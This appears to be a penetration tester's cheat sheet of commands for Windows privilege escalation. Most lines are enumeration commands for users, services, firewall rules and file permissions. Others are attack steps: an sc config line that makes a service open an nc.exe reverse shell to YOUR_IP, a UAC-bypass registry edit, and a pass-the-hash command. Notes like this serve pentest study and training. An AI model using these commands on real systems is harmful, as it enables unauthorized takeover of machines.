###### Basic Privesc Emumeration for Windows
```
whoami
whoami /priv
---
net user // Discover other users
---
net user <user> // Enumerate info for selected user
---
hostname
---
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" // View System Info
---
tasklist /SVC // Processes
---
ipconfig /all
---
route print // network routing tables 
---
netstat -ano // Veiw active network connections 
a = all active TCP connection
n = ip/ports
o = PID
```
###### Enumerating Firewalls for Windows
```
netsh advfirewall show currentprofile // Current firewall profile
---
netsh advfirewall firewall show rule name=all // Firewall rules
```
###### Enumerating Scheduled Tasks for Windows
```
schtasks /query /fo LIST /v // List Tasks
```
###### Enumerating installed applications for Windows
```
wmic product get name, version, vendor // Info on installed apps
---
wmic qfe get Caption, Description, HotFixID, InstalledOn // Full Sys updates
```
###### Enumerating R/W files for Windows
```
[Download accesschk.exe onto Target]
accesschk.exe -uws "Everyone" "<Path to DIR>" // Will check for w-W files 
---
[powershell]
Get-ChildItem "<PATH TO DIR>" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```
###### Enumerating Unmounted Disks for Windows
```
mountvol
```
###### Enumerating Drivers and Kernal Modules for Windows
```
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start mod
e', Path // Lists display name, start mode and path
---
 Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"} //Target specific drivers
```
###### AutoElevate Binaries for Windows
```
regedit //opens Registry Editor 
---
reg query HKEY_CURRENT_USER
---
REG ADD HKCU\path\to\Shell\Open\command /v DelegateExecute /t REG_SZ
```
###### 
Insecure file permissions for Windows
```
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'} // shows service/path
---

```
***
#### The Automated Stuff
###### Windows
```
windows-privesc-check2.exe // http://pentestmonkey.net/windows-privesc-check

windows-privesc-check2.exe--dump -G Dump Groups 
---
windows-privesc-check2.exe --dump -G -H // Dump Groups & Shares
---
windows-privesc-check2.exe --dump -M -V // Dump password policy & privs for users and groups
---
windows-privesc-check2.exe -A // All files and Dirs
--
windows-privesc-check2.exe --pyshell // o.O 
---
procmon.exe
---
sigcheck.exe -a -m C:\path\to\binarie
---
sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe YOUR_IP 1234 -e C:\WINDOWS\System32\cmd.exe"  //XP SP1 2001 
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
```
###### Windows
```
[Examples]

whoami /groups // Look for Medium integrity level
-
net user admin NewPassword // Try set new password (Most likely will fail)
-
powershell.exe Start-Process cmd.exe -Verb runAs // Privesc
```
```
wmic service where caption="Service" get name, caption, state, startmode // Check start mode and active status
---
pth-winexe -U <user>%<lm hash>:<NTLM hash> //<Target IP> cmd /// Pass the Hash 
```
